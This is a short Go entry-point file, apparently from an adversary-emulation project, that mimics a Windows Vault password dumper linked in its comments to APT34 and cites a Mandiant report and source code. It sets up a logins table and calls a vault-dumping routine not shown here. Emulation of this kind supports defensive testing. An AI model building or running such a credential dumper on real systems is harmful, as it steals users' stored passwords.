// Adapted to behave like “Windows Vault Password Dumper” browser credential theft tool
// from Massimiliano Montoro, the developer of Cain & Abel.
//
// CTI Sources:
// https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network
//
// Code Sources:
// http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt
// https://github.com/danieljoos/winvault

package main

import (
	"db"
	"vault"
	"log"
)

func main() {
	var database = db.InitializeDB()
	err := database.CreateLoginsTable()
	if err != nil {
		log.Fatal(err)
	}
	vault.DumpVault(database)
}
